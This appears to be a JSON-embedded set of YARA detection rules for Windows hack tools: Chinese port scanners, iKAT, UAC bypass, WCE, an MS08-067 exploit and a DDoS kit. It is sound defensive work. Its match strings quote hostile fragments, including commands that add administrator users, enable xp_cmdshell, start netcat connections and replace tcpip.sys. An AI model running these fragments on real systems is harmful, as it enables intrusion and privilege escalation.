  "CN_Hacktool_ScanPort_Portscanner": "rule CN_Hacktool_ScanPort_Portscanner {\n\tmeta:\n\t\tdescription = \"Detects a chinese Portscanner named ScanPort\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 70\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$s0 = \"LScanPort\" fullword wide\n\t\t$s1 = \"LScanPort Microsoft\" fullword wide\n\t\t$s2 = \"www.yupsoft.com\" fullword wide\n\tcondition:\n\t\tall of them\n}",
  "CN_Hacktool_S_EXE_Portscanner": "rule CN_Hacktool_S_EXE_Portscanner {\n\tmeta:\n\t\tdescription = \"Detects a chinese Portscanner named s.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 70\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$s0 = \"\\\\Result.txt\" fullword ascii\n\t\t$s1 = \"By:ZT QQ:376789051\" fullword ascii\n\t\t$s2 = \"(http://www.eyuyan.com)\" fullword wide\n\tcondition:\n\t\tall of them\n}",
  "CN_Hacktool_MilkT_BAT": "rule CN_Hacktool_MilkT_BAT {\n\tmeta:\n\t\tdescription = \"Detects a chinese Portscanner named MilkT - shipped BAT\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 70\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$s0 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" ascii\n\t\t$s1 = \"if not \\\"%Choice%\\\"==\\\"\\\" set Choice=%Choice:~0,1%\" ascii\n\tcondition:\n\t\tall of them\n}",
  "CN_Hacktool_MilkT_Scanner": "rule CN_Hacktool_MilkT_Scanner {\n\tmeta:\n\t\tdescription = \"Detects a chinese Portscanner named MilkT\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 60\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$s0 = \"Bf **************\" ascii fullword\n\t\t$s1 = \"forming Time: %d/\" ascii\n\t\t$s2 = \"KERNEL32.DLL\" ascii fullword\n\t\t$s3 = \"CRTDLL.DLL\" ascii fullword\n\t\t$s4 = \"WS2_32.DLL\" ascii fullword\n\t\t$s5 = \"GetProcAddress\" ascii fullword\n\t\t$s6 = \"atoi\" ascii fullword\n\tcondition:\n\t\tall of them\n}",
  "CN_Hacktool_1433_Scanner": "rule CN_Hacktool_1433_Scanner {\n\tmeta:\n\t\tdescription = \"Detects a chinese MSSQL scanner\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 40\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$magic = { 4d 5a }\n\t\t$s0 = \"1433\" wide fullword\n\t\t$s1 = \"1433V\" wide\n\t\t$s2 = \"del Weak1.txt\" ascii fullword\n\t\t$s3 = \"del Attack.txt\" ascii fullword\n\t\t$s4 = \"del /s /Q C:\\\\Windows\\\\system32\\\\doors\\\\\" fullword ascii\n\t\t$s5 = \"!&start iexplore http://www.crsky.com/soft/4818.html)\" fullword ascii\n\tcondition:\n\t\t( $magic at 0 ) and all of ($s*)\n}",
  "CN_Hacktool_1433_Scanner_Comp2": "rule CN_Hacktool_1433_Scanner_Comp2 {\n\tmeta:\n\t\tdescription = \"Detects a chinese MSSQL scanner - component 2\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 40\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$magic = { 4d 5a }\n\t\t$s0 = \"1433\" wide fullword\n\t\t$s1 = \"1433V\" wide\n\t\t$s2 = \"UUUMUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUMUUU\" ascii fullword\n\tcondition:\n\t\t( $magic at 0 ) and all of ($s*)\n}",
  "WCE_Modified_1_1014": "rule WCE_Modified_1_1014 {\n\tmeta:\n\t\tdescription = \"Modified (packed) version of Windows Credential Editor\"\n\t\tauthor = \"Florian Roth\"\n\t\thash = \"09a412ac3c85cedce2642a19e99d8f903a2e0354\"\n\t\tscore = 70\n\tstrings:\n\t\t$s0 = \"LSASS.EXE\" fullword ascii\n\t\t$s1 = \"_CREDS\" ascii\n\t\t$s9 = \"Using WCE \" ascii\n\tcondition:\n\t\tall of them\n}",
  "ReactOS_cmd_valid": "rule ReactOS_cmd_valid {\n\tmeta:\n\t\tdescription = \"ReactOS cmd.exe with correct file name - maybe packed with software or part of hacker toolset\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\treference = \"http://www.elifulkerson.com/articles/suzy-sells-cmd-shells.php\"\n\t\tscore = 30\n\t\thash = \"b88f050fa69d85af3ff99af90a157435296cbb6e\"\n\tstrings:\n\t\t$s1 = \"ReactOS Command Processor\" fullword wide\n\t\t$s2 = \"Copyright (C) 1994-1998 Tim Norman and others\" fullword wide\n\t\t$s3 = \"Eric Kohl and others\" fullword wide\n\t\t$s4 = \"ReactOS Operating System\" fullword wide\n\tcondition:\n\t\tall of ($s*)\n}",
  "iKAT_wmi_rundll": "rule iKAT_wmi_rundll {\n\tmeta:\n\t\tdescription = \"This exe will attempt to use WMI to Call the Win32_Process event to spawn rundll - file wmi_rundll.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 65\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"97c4d4e6a644eed5aa12437805e39213e494d120\"\n\tstrings:\n\t\t$s0 = \"This operating system is not supported.\" fullword ascii\n\t\t$s1 = \"Error!\" fullword ascii\n\t\t$s2 = \"Win32 only!\" fullword ascii\n\t\t$s3 = \"COMCTL32.dll\" fullword ascii\n\t\t$s4 = \"[LordPE]\" ascii\n\t\t$s5 = \"CRTDLL.dll\" fullword ascii\n\t\t$s6 = \"VBScript\" fullword ascii\n\t\t$s7 = \"CoUninitialize\" fullword ascii\n\tcondition:\n\t\tall of them and filesize < 15KB\n}",
  "iKAT_revelations": "rule iKAT_revelations {\n\tmeta:\n\t\tdescription = \"iKAT hack tool showing the content of password fields - file revelations.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 75\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"c4e217a8f2a2433297961561c5926cbd522f7996\"\n\tstrings:\n\t\t$s0 = \"The RevelationHelper.DLL file is corrupt or missing.\" fullword ascii\n\t\t$s8 = \"BETAsupport@snadboy.com\" fullword wide\n\t\t$s9 = \"support@snadboy.com\" fullword wide\n\t\t$s14 = \"RevelationHelper.dll\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "iKAT_priv_esc_tasksch": "rule iKAT_priv_esc_tasksch {\n\tmeta:\n\t\tdescription = \"Task Schedulder Local Exploit - Windows local priv-esc using Task Scheduler, published by webDevil. Supports Windows 7 and Vista.\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 75\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"84ab94bff7abf10ffe4446ff280f071f9702cf8b\"\n\tstrings:\n\t\t$s0 = \"objShell.Run \\\"schtasks /change /TN wDw00t /disable\\\",,True\" fullword ascii\n\t\t$s3 = \"objShell.Run \\\"schtasks /run /TN wDw00t\\\",,True\" fullword ascii\n\t\t$s4 = \"'objShell.Run \\\"cmd /c copy C:\\\\windows\\\\system32\\\\tasks\\\\wDw00t .\\\",,True\" fullword ascii\n\t\t$s6 = \"a.WriteLine (\\\"schtasks /delete /f /TN wDw00t\\\")\" fullword ascii\n\t\t$s7 = \"a.WriteLine (\\\"net user /add ikat ikat\\\")\" fullword ascii\n\t\t$s8 = \"a.WriteLine (\\\"cmd.exe\\\")\" fullword ascii\n\t\t$s9 = \"strFileName=\\\"C:\\\\windows\\\\system32\\\\tasks\\\\wDw00t\\\"\" fullword ascii\n\t\t$s10 = \"For n = 1 To (Len (hexXML) - 1) step 2\" fullword ascii\n\t\t$s13 = \"output.writeline \\\" Should work on Vista/Win7/2008 x86/x64\\\"\" fullword ascii\n\t\t$s11 = \"Set objExecObject = objShell.Exec(\\\"cmd /c schtasks /query /XML /TN wDw00t\\\")\" fullword ascii\n\t\t$s12 = \"objShell.Run \\\"schtasks /create /TN wDw00t /sc monthly /tr \\\"\\\"\\\"+biatchFile+\\\"\" ascii\n\t\t$s14 = \"a.WriteLine (\\\"net localgroup administrators /add v4l\\\")\" fullword ascii\n\t\t$s20 = \"Set ts = fso.createtextfile (\\\"wDw00t.xml\\\")\" fullword ascii\n\tcondition:\n\t\t2 of them\n}",
  "iKAT_command_lines_agent": "rule iKAT_command_lines_agent {\n\tmeta:\n\t\tdescription = \"iKAT hack tools set agent - file ikat.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 75\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"c802ee1e49c0eae2a3fc22d2e82589d857f96d94\"\n\tstrings:\n\t\t$s0 = \"Extended Module: super mario brothers\" fullword ascii\n\t\t$s1 = \"Extended Module: \" fullword ascii\n\t\t$s3 = \"ofpurenostalgicfeeling\" fullword ascii\n\t\t$s8 = \"-supermariobrotheretic\" fullword ascii\n\t\t$s9 = \"!http://132.147.96.202:80\" fullword ascii\n\t\t$s12 = \"iKAT Exe Template\" fullword ascii\n\t\t$s15 = \"withadancyflavour..\" fullword ascii\n\t\t$s16 = \"FastTracker v2.00   \" fullword ascii\n\tcondition:\n\t\t4 of them\n}",
  "iKAT_cmd_as_dll": "rule iKAT_cmd_as_dll {\n\tmeta:\n\t\tdescription = \"iKAT toolset file cmd.dll ReactOS file cloaked\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 65\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"b5d0ba941efbc3b5c97fe70f70c14b2050b8336a\"\n\tstrings:\n\t\t$s1 = \"cmd.exe\" fullword wide\n\t\t$s2 = \"ReactOS Development Team\" fullword wide\n\t\t$s3 = \"ReactOS Command Processor\" fullword wide\n\n\t\t$ext = \"extension: .dll\" nocase\n\tcondition:\n\t\tall of ($s*) and $ext\n}",
  "iKAT_tools_nmap": "rule iKAT_tools_nmap {\n\tmeta:\n\t\tdescription = \"Generic rule for NMAP - based on NMAP 4 standalone\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 50\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"d0543f365df61e6ebb5e345943577cc40fca8682\"\n\tstrings:\n\t\t$s0 = \"Insecure.Org\" fullword wide\n\t\t$s1 = \"Copyright (c) Insecure.Com\" fullword wide\n\t\t$s2 = \"nmap\" fullword nocase\n\t\t$s3 = \"Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm).\" ascii\n\tcondition:\n\t\tall of them\n}",
  "iKAT_startbar": "rule iKAT_startbar {\n\tmeta:\n\t\tdescription = \"Tool to hide unhide the windows startbar from command line - iKAT hack tools - file startbar.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 50\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"0cac59b80b5427a8780168e1b85c540efffaf74f\"\n\tstrings:\n\t\t$s2 = \"Shinysoft Limited1\" fullword ascii\n\t\t$s3 = \"Shinysoft Limited0\" fullword ascii\n\t\t$s4 = \"Wellington1\" fullword ascii\n\t\t$s6 = \"Wainuiomata1\" fullword ascii\n\t\t$s8 = \"56 Wright St1\" fullword ascii\n\t\t$s9 = \"UTN-USERFirst-Object\" fullword ascii\n\t\t$s10 = \"New Zealand1\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "iKAT_gpdisable_customcmd_kitrap0d_uacpoc": "rule iKAT_gpdisable_customcmd_kitrap0d_uacpoc {\n\tmeta:\n\t\tdescription = \"iKAT hack tool set generic rule - from files gpdisable.exe, customcmd.exe, kitrap0d.exe, uacpoc.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\tsuper_rule = 1\n\t\thash0 = \"814c126f21bc5e993499f0c4e15b280bf7c1c77f\"\n\t\thash1 = \"2725690954c2ad61f5443eb9eec5bd16ab320014\"\n\t\thash2 = \"75f5aed1e719443a710b70f2004f34b2fe30f2a9\"\n\t\thash3 = \"b65a460d015fd94830d55e8eeaf6222321e12349\"\n\t\tscore = 20\n\tstrings:\n\t\t$s0 = \"Failed to get temp file for source AES decryption\" fullword\n\t\t$s5 = \"Failed to get encryption header for pwd-protect\" fullword\n\t\t$s17 = \"Failed to get filetime\" fullword\n\t\t$s20 = \"Failed to delete temp file for password decoding (3)\" fullword\n\tcondition:\n\t\tall of them\n}",
  "iKAT_Tool_Generic": "rule iKAT_Tool_Generic {\n\tmeta:\n\t\tdescription = \"Generic Rule for hack tool iKAT files gpdisable.exe, kitrap0d.exe, uacpoc.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 55\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\tsuper_rule = 1\n\t\thash0 = \"814c126f21bc5e993499f0c4e15b280bf7c1c77f\"\n\t\thash1 = \"75f5aed1e719443a710b70f2004f34b2fe30f2a9\"\n\t\thash2 = \"b65a460d015fd94830d55e8eeaf6222321e12349\"\n\tstrings:\n\t\t$s0 = \"<IconFile>C:\\\\WINDOWS\\\\App.ico</IconFile>\" fullword\n\t\t$s1 = \"Failed to read the entire file\" fullword\n\t\t$s4 = \"<VersionCreatedBy>14.4.0</VersionCreatedBy>\" fullword\n\t\t$s8 = \"<ProgressCaption>Run &quot;executor.bat&quot; once the shell has spawned.</P\"\n\t\t$s9 = \"Running Zip pipeline...\" fullword\n\t\t$s10 = \"<FinTitle />\" fullword\n\t\t$s12 = \"<AutoTemp>0</AutoTemp>\" fullword\n\t\t$s14 = \"<DefaultDir>%TEMP%</DefaultDir>\" fullword\n\t\t$s15 = \"AES Encrypting...\" fullword\n\t\t$s20 = \"<UnzipDir>%TEMP%</UnzipDir>\" fullword\n\tcondition:\n\t\tall of them\n}",
  "BypassUac2": "rule BypassUac2 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file BypassUac2.zip\"\n\t\tauthor = \"yarGen Yara Rule Generator\"\n\t\thash = \"ef3e7dd2d1384ecec1a37254303959a43695df61\"\n\tstrings:\n\t\t$s0 = \"/BypassUac/BypassUac/BypassUac_Utils.cpp\" fullword ascii\n\t\t$s1 = \"/BypassUac/BypassUacDll/BypassUacDll.aps\" fullword ascii\n\t\t$s3 = \"/BypassUac/BypassUac/BypassUac.ico\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "BypassUac_3": "rule BypassUac_3 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file BypassUacDll.dll\"\n\t\tauthor = \"yarGen Yara Rule Generator\"\n\t\thash = \"1974aacd0ed987119999735cad8413031115ce35\"\n\tstrings:\n\t\t$s0 = \"BypassUacDLL.dll\" fullword wide\n\t\t$s1 = \"\\\\Release\\\\BypassUacDll\" ascii\n\t\t$s3 = \"Win7ElevateDLL\" fullword wide\n\t\t$s7 = \"BypassUacDLL\" fullword wide\n\tcondition:\n\t\t3 of them\n}",
  "BypassUac_9": "rule BypassUac_9 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file BypassUac.zip\"\n\t\tauthor = \"yarGen Yara Rule Generator\"\n\t\thash = \"93c2375b2e4f75fc780553600fbdfd3cb344e69d\"\n\tstrings:\n\t\t$s0 = \"/x86/BypassUac.exe\" fullword ascii\n\t\t$s1 = \"/x64/BypassUac.exe\" fullword ascii\n\t\t$s2 = \"/x86/BypassUacDll.dll\" fullword ascii\n\t\t$s3 = \"/x64/BypassUacDll.dll\" fullword ascii\n\t\t$s15 = \"BypassUac\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "BypassUacDll_6": "rule BypassUacDll_6 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file BypassUacDll.aps\"\n\t\tauthor = \"yarGen Yara Rule Generator\"\n\t\thash = \"58d7b24b6870cb7f1ec4807d2f77dd984077e531\"\n\tstrings:\n\t\t$s3 = \"BypassUacDLL.dll\" fullword wide\n\t\t$s4 = \"AFX_IDP_COMMAND_FAILURE\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "BypassUacDll_7": "rule BypassUacDll_7 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file BypassUacDll.aps\"\n\t\tauthor = \"yarGen Yara Rule Generator\"\n\t\thash = \"58d7b24b6870cb7f1ec4807d2f77dd984077e531\"\n\tstrings:\n\t\t$s3 = \"BypassUacDLL.dll\" fullword wide\n\t\t$s4 = \"AFX_IDP_COMMAND_FAILURE\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "BypassUac_EXE": "rule BypassUac_EXE {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file BypassUacDll.aps\"\n\t\tauthor = \"yarGen Yara Rule Generator\"\n\t\thash = \"58d7b24b6870cb7f1ec4807d2f77dd984077e531\"\n\tstrings:\n\t\t$s1 = \"Wole32.dll\" wide\n\t\t$s3 = \"System32\\\\migwiz\" wide\n\t\t$s4 = \"System32\\\\migwiz\\\\CRYPTBASE.dll\" wide\n\t\t$s5 = \"Elevation:Administrator!new:\" wide\n\t\t$s6 = \"BypassUac\" wide\n\tcondition:\n\t\tall of them\n}",
  "APT_Proxy_Malware_Packed_dev": "rule APT_Proxy_Malware_Packed_dev\n{\n\tmeta:\n\t\tauthor = \"FRoth\"\n\t\tdate = \"2014-11-10\"\n\t\tdescription = \"APT Malware - Proxy\"\n\t\thash = \"6b6a86ceeab64a6cb273debfa82aec58\"\n\t\tscore = 50\n\tstrings:\n\t\t$string0 = \"PECompact2\" fullword\n\t\t$string1 = \"[LordPE]\"\n\t\t$string2 = \"steam_ker.dll\"\n\tcondition:\n\t\tall of them\n}",
  "Tzddos_DDoS_Tool_CN": "rule Tzddos_DDoS_Tool_CN {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file tzddos\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"d4c517eda5458247edae59309453e0ae7d812f8e\"\n\tstrings:\n\t\t$s0 = \"for /f %%a in (host.txt) do (\" fullword ascii\n\t\t$s1 = \"for /f \\\"eol=S tokens=1 delims= \\\" %%i in (s2.txt) do echo %%i>>host.txt\" fullword ascii\n\t\t$s2 = \"del host.txt /q\" fullword ascii\n\t\t$s3 = \"for /f \\\"eol=- tokens=1 delims= \\\" %%i in (result.txt) do echo %%i>>s1.txt\" fullword ascii\n\t\t$s4 = \"start Http.exe %%a %http%\" fullword ascii\n\t\t$s5 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" fullword ascii\n\t\t$s6 = \"del Result.txt s2.txt s1.txt \" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "Ncat_Hacktools_CN": "rule Ncat_Hacktools_CN {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file nc.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"001c0c01c96fa56216159f83f6f298755366e528\"\n\tstrings:\n\t\t$s0 = \"nc -l -p port [options] [hostname] [port]\" fullword ascii\n\t\t$s2 = \"nc [-options] hostname port[s] [ports] ... \" fullword ascii\n\t\t$s3 = \"gethostpoop fuxored\" fullword ascii\n\t\t$s6 = \"VERNOTSUPPORTED\" fullword ascii\n\t\t$s7 = \"%s [%s] %d (%s)\" fullword ascii\n\t\t$s12 = \" `--%s' doesn't allow an argument\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "MS08_067_Exploit_Hacktools_CN": "rule MS08_067_Exploit_Hacktools_CN {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file cs.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"a3e9e0655447494253a1a60dbc763d9661181322\"\n\tstrings:\n\t\t$s0 = \"MS08-067 Exploit for CN by EMM@ph4nt0m.org\" fullword ascii\n\t\t$s3 = \"Make SMB Connection error:%d\" fullword ascii\n\t\t$s5 = \"Send Payload Over!\" fullword ascii\n\t\t$s7 = \"Maybe Patched!\" fullword ascii\n\t\t$s8 = \"RpcExceptionCode() = %u\" fullword ascii\n\t\t$s11 = \"ph4nt0m\" fullword wide\n\t\t$s12 = \"\\\\\\\\%s\\\\IPC\" ascii\n\tcondition:\n\t\t4 of them\n}",
  "Hacktools_CN_Burst_sql": "rule Hacktools_CN_Burst_sql {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file sql.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"d5139b865e99b7a276af7ae11b14096adb928245\"\n\tstrings:\n\t\t$s0 = \"s.exe %s %s %s %s %d /save\" fullword ascii\n\t\t$s2 = \"s.exe start error...%d\" fullword ascii\n\t\t$s4 = \"EXEC sp_addextendedproc xp_cmdshell,'xplog70.dll'\" fullword ascii\n\t\t$s7 = \"EXEC master..xp_cmdshell 'wscript.exe cc.js'\" fullword ascii\n\t\t$s10 = \"Result.txt\" fullword ascii\n\t\t$s11 = \"Usage:sql.exe [options]\" fullword ascii\n\t\t$s17 = \"%s root %s %d error\" fullword ascii\n\t\t$s18 = \"Pass.txt\" fullword ascii\n\t\t$s20 = \"SELECT sillyr_at_gmail_dot_com INTO DUMPFILE '%s\\\\\\\\sillyr_x.so' FROM sillyr_x\" fullword ascii\n\tcondition:\n\t\t6 of them\n}",
  "Hacktools_CN_Panda_445TOOL": "rule Hacktools_CN_Panda_445TOOL {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file 445TOOL.rar\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"92050ba43029f914696289598cf3b18e34457a11\"\n\tstrings:\n\t\t$s0 = \"scan.bat\" fullword ascii\n\t\t$s1 = \"Http.exe\" fullword ascii\n\t\t$s2 = \"GOGOGO.bat\" fullword ascii\n\t\t$s3 = \"ip.txt\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "Hacktools_CN_Panda_445": "rule Hacktools_CN_Panda_445 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file 445.rar\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"a61316578bcbde66f39d88e7fc113c134b5b966b\"\n\tstrings:\n\t\t$s0 = \"for /f %%i in (ips.txt) do (start cmd.bat %%i)\" fullword ascii\n\t\t$s1 = \"445\\\\nc.exe\" fullword ascii\n\t\t$s2 = \"445\\\\s.exe\" fullword ascii\n\t\t$s3 = \"cs.exe %1\" fullword ascii\n\t\t$s4 = \"445\\\\cs.exe\" fullword ascii\n\t\t$s5 = \"445\\\\ip.txt\" fullword ascii\n\t\t$s6 = \"445\\\\cmd.bat\" fullword ascii\n\t\t$s9 = \"@echo off\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "Hacktools_CN_WinEggDrop": "rule Hacktools_CN_WinEggDrop {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file s.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"7665011742ce01f57e8dc0a85d35ec556035145d\"\n\tstrings:\n\t\t$s0 = \"Normal Scan: About To Scan %u IP For %u Ports Using %d Thread\" fullword ascii\n\t\t$s2 = \"SYN Scan: About To Scan %u IP For %u Ports Using %d Thread\" fullword ascii\n\t\t$s6 = \"Example: %s TCP 12.12.12.12 12.12.12.254 21 512 /Banner\" fullword ascii\n\t\t$s8 = \"Something Wrong About The Ports\" fullword ascii\n\t\t$s9 = \"Performing Time: %d/%d/%d %d:%d:%d --> \" fullword ascii\n\t\t$s10 = \"Example: %s TCP 12.12.12.12/24 80 512 /T8 /Save\" fullword ascii\n\t\t$s12 = \"%u Ports Scanned.Taking %d Threads \" fullword ascii\n\t\t$s13 = \"%-16s %-5d -> \\\"%s\\\"\" fullword ascii\n\t\t$s14 = \"SYN Scan Can Only Perform On WIN 2K Or Above\" fullword ascii\n\t\t$s17 = \"SYN Scan: About To Scan %s:%d Using %d Thread\" fullword ascii\n\t\t$s18 = \"Scan %s Complete In %d Hours %d Minutes %d Seconds. Found %u Open Ports\" fullword ascii\n\tcondition:\n\t\t5 of them\n}",
  "Hacktools_CN_Scan_BAT": "rule Hacktools_CN_Scan_BAT {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file scan.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"6517d7c245f1300e42f7354b0fe5d9666e5ce52a\"\n\tstrings:\n\t\t$s0 = \"for /f %%a in (host.txt) do (\" fullword ascii\n\t\t$s1 = \"for /f \\\"eol=S tokens=1 delims= \\\" %%i in (s2.txt) do echo %%i>>host.txt\" fullword ascii\n\t\t$s2 = \"del host.txt /q\" fullword ascii\n\t\t$s3 = \"for /f \\\"eol=- tokens=1 delims= \\\" %%i in (result.txt) do echo %%i>>s1.txt\" fullword ascii\n\t\t$s4 = \"start Http.exe %%a %http%\" fullword ascii\n\t\t$s5 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" fullword ascii\n\tcondition:\n\t\t5 of them\n}",
  "Hacktools_CN_Panda_Burst": "rule Hacktools_CN_Panda_Burst {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file Burst.rar\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"ce8e3d95f89fb887d284015ff2953dbdb1f16776\"\n\tstrings:\n\t\t$s0 = \"@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http://60.15.124.106:63389/tasksvr.\" ascii\n\tcondition:\n\t\tall of them\n}",
  "Hacktools_CN_445_cmd": "rule Hacktools_CN_445_cmd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file cmd.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"69b105a3aec3234819868c1a913772c40c6b727a\"\n\tstrings:\n\t\t$bat = \"@echo off\" fullword ascii\n\t\t$s0 = \"cs.exe %1\" fullword ascii\n\t\t$s2 = \"nc %1 4444\" fullword ascii\n\tcondition:\n\t\t$bat at 0 and all of ($s*)\n}",
  "Hacktools_CN_GOGOGO_Bat": "rule Hacktools_CN_GOGOGO_Bat {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file GOGOGO.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"4bd4f5b070acf7fe70460d7eefb3623366074bbd\"\n\tstrings:\n\t\t$s0 = \"for /f \\\"delims=\\\" %%x in (endend.txt) do call :lisoob %%x\" fullword ascii\n\t\t$s1 = \"http://www.tzddos.com/ -------------------------------------------->byebye.txt\" fullword ascii\n\t\t$s2 = \"ren %systemroot%\\\\system32\\\\drivers\\\\tcpip.sys tcpip.sys.bak\" fullword ascii\n\t\t$s4 = \"IF /I \\\"%wangle%\\\"==\\\"\\\" ( goto start ) else ( goto erromm )\" fullword ascii\n\t\t$s5 = \"copy *.tzddos scan.bat&del *.tzddos\" fullword ascii\n\t\t$s6 = \"del /f tcpip.sys\" fullword ascii\n\t\t$s9 = \"if /i \\\"%CB%\\\"==\\\"www.tzddos.com\\\" ( goto mmbat ) else ( goto wangle )\" fullword ascii\n\t\t$s10 = \"call scan.bat\" fullword ascii\n\t\t$s12 = \"IF /I \\\"%erromm%\\\"==\\\"\\\" ( goto start ) else ( goto zuihoujh )\" fullword ascii\n\t\t$s13 = \"IF /I \\\"%zuihoujh%\\\"==\\\"\\\" ( goto start ) else ( goto laji )\" fullword ascii\n\t\t$s18 = \"sc config LmHosts start= auto\" fullword ascii\n\t\t$s19 = \"copy tcpip.sys %systemroot%\\\\system32\\\\drivers\\\\tcpip.sys > nul\" fullword ascii\n\t\t$s20 = \"ren %systemroot%\\\\system32\\\\dllcache\\\\tcpip.sys tcpip.sys.bak\" fullword ascii\n\tcondition:\n\t\t3 of them\n}",
  "Hacktools_CN_Burst_pass": "rule Hacktools_CN_Burst_pass {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file pass.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"55a05cf93dbd274355d798534be471dff26803f9\"\n\tstrings:\n\t\t$s0 = \"123456.com\" fullword ascii\n\t\t$s1 = \"123123.com\" fullword ascii\n\t\t$s2 = \"360.com\" fullword ascii\n\t\t$s3 = \"123.com\" fullword ascii\n\t\t$s4 = \"juso.com\" fullword ascii\n\t\t$s5 = \"sina.com\" fullword ascii\n\t\t$s7 = \"changeme\" fullword ascii\n\t\t$s8 = \"master\" fullword ascii\n\t\t$s9 = \"google.com\" fullword ascii\n\t\t$s10 = \"chinanet\" fullword ascii\n\t\t$s12 = \"lionking\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
